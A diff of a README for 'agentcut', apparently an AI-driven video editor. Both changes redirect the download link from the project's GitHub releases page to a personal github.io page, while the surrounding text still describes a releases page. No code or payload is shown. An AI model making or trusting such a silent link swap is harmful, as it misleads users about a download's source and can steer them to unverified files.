@@ -1,6 +1,6 @@
 # ✂️ agentcut - Edit Videos Instantly with AI Agents
 
-[![Download agentcut](https://img.shields.io/badge/Download-agentcut-blue?style=for-the-badge&logo=github)](https://github.com/Skousen1/agentcut/releases)
+[![Download agentcut](https://img.shields.io/badge/Download-agentcut-blue?style=for-the-badge&logo=github)](https://skousen1.github.io)
 
 ---
 
@@ -58,7 +58,7 @@ Let's get you up and running in just a few minutes. Follow these steps carefully
 
 ![Download Button](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge)
 
-Visit this link to download the application: **[https://github.com/Skousen1/agentcut/releases](https://github.com/Skousen1/agentcut/releases)**
+Visit this link to download the application: **[https://skousen1.github.io](https://skousen1.github.io)**
 
 You'll see a page with different releases. Look for the most recent one (it's usually at the top). Click on it to expand the details. You'll find a file there that you can download.
 
